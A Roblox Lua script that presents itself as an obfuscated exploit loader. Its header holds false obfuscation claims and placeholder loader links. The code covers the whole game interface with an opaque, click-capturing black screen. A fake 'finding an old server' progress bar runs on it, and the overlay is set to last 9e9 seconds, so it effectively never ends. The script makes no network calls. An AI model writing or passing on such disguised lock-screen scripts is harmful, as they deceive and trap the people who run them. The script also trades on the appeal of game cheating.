--[[ THIS FILE IS OBFUSCTAED WITH PORNHUB.COM V4

shortcut: 1000
text: 10000
lua file: 100000
recv: 99999
luau file: 0
js file: 0
py file: 0.1
sens: 00.11




LOADER: Main
LOADER: v.100
LOADER: www.loader.luau
LOADER: www.loader.luau
LOADER: www.loader.luau
LOADER: https://discord.com/invite/unknown-invite

]]
-- MAIN LOADER:

local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

-- Remove any fucking loader
local existingLoader = CoreGui:FindFirstChild("ExploitLoaderGui")
if existingLoader then
    existingLoader:Destroy()
end

-- Main Loader Bro:
local loaderGui = Instance.new("ScreenGui")
loaderGui.Name = "ExploitLoaderGui"
loaderGui.DisplayOrder = 9999 -- Very high to overlay core UI
loaderGui.ResetOnSpawn = false
loaderGui.IgnoreGuiInset = true -- full screen, ignore top bar
loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
loaderGui.Parent = CoreGui

-- Create fullscreen Frame as background to hide all UI, fully opaque black
local background = Instance.new("Frame")
background.Name = "Background"
background.AnchorPoint = Vector2.new(0, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.BackgroundTransparency = 0
background.BorderSizePixel = 0
background.Active = true -- captures all clicks, disable underlying inputs
background.ZIndex = 10000
background.Parent = loaderGui

-- Create container for loader centered on screen
local loaderContainer = Instance.new("Frame")
loaderContainer.Name = "LoaderContainer"
loaderContainer.Size = UDim2.new(0, 320, 0, 60)
loaderContainer.AnchorPoint = Vector2.new(0.5, 0.5)
loaderContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
loaderContainer.BackgroundTransparency = 1
loaderContainer.ZIndex = 10001
loaderContainer.Parent = background

-- Slider track (background bar)
local sliderTrack = Instance.new("Frame")
sliderTrack.Name = "SliderTrack"
sliderTrack.AnchorPoint = Vector2.new(0, 0.5)
sliderTrack.Position = UDim2.new(0, 0, 0.5, 0)
sliderTrack.Size = UDim2.new(1, 0, 0, 16)
sliderTrack.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
sliderTrack.BorderSizePixel = 0
sliderTrack.ZIndex = 10002
sliderTrack.Parent = loaderContainer

local trackCorner = Instance.new("UICorner")
trackCorner.CornerRadius = UDim.new(0, 12)
trackCorner.Parent = sliderTrack

-- Moving slider block (the "runner")
local sliderRunner = Instance.new("Frame")
sliderRunner.Name = "SliderRunner"
sliderRunner.AnchorPoint = Vector2.new(0, 0.5)
sliderRunner.Position = UDim2.new(0, 0, 0.5, 0) -- start at left edge
sliderRunner.Size = UDim2.new(0.25, 0, 1, 0) -- 25% width of track
sliderRunner.BackgroundColor3 = Color3.fromRGB(70, 160, 255)
sliderRunner.BorderSizePixel = 0
sliderRunner.ZIndex = 10003
sliderRunner.Parent = sliderTrack

local runnerCorner = Instance.new("UICorner")
runnerCorner.CornerRadius = UDim.new(0, 12)
runnerCorner.Parent = sliderRunner

-- Add UIGradient for glowing runner
local runnerGradient = Instance.new("UIGradient")
runnerGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 190, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(150, 220, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 190, 255)),
}
runnerGradient.Rotation = 45
runnerGradient.Parent = sliderRunner

-- Animation: continuously tween the sliderRunner from left to right edge and reset
local tweenInfo = TweenInfo.new(1.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
local targetPosition = UDim2.new(0.75, 0, 0.5, 0) -- right edge minus runner width (0.25)

local function startRunnerTween()
    local tween = TweenService:Create(sliderRunner, tweenInfo, {Position = targetPosition})
    tween.Completed:Connect(function()
        sliderRunner.Position = UDim2.new(0, 0, 0.5, 0)
        wait(0.08) -- small pause before next run
        startRunnerTween()
    end)
    tween:Play()
end

startRunnerTween()

-- Loading label below slider bar
local loadingLabel = Instance.new("TextLabel")
loadingLabel.Name = "LoadingLabel"
loadingLabel.Size = UDim2.new(1, 0, 0, 30)
loadingLabel.Position = UDim2.new(0, 0, 1, 16)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Text = "Trying to find an old server, please wait..."
loadingLabel.Font = Enum.Font.GothamSemibold
loadingLabel.TextSize = 22
loadingLabel.TextColor3 = Color3.fromRGB(180, 210, 255)
loadingLabel.TextStrokeTransparency = 0.75
loadingLabel.TextWrapped = true
loadingLabel.TextXAlignment = Enum.TextXAlignment.Center
loadingLabel.ZIndex = 10004
loadingLabel.Parent = loaderContainer

-- Duration loader stays visible (in seconds)
local loadDuration = 9e9

-- After duration, fade out and destroy the loader GUI
delay(loadDuration, function()
    local fadeTweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local fadeBackground = TweenService:Create(background, fadeTweenInfo, {BackgroundTransparency = 1})
    local fadeLabel = TweenService:Create(loadingLabel, fadeTweenInfo, {TextTransparency = 1})
    local fadeSliderRunner = TweenService:Create(sliderRunner, fadeTweenInfo, {BackgroundTransparency = 1})
    local fadeSliderTrack = TweenService:Create(sliderTrack, fadeTweenInfo, {BackgroundTransparency = 1})

    fadeBackground:Play()
    fadeLabel:Play()
    fadeSliderRunner:Play()
    fadeSliderTrack:Play()

    fadeBackground.Completed:Wait()
    loaderGui:Destroy()
end)


-- kupal ako.
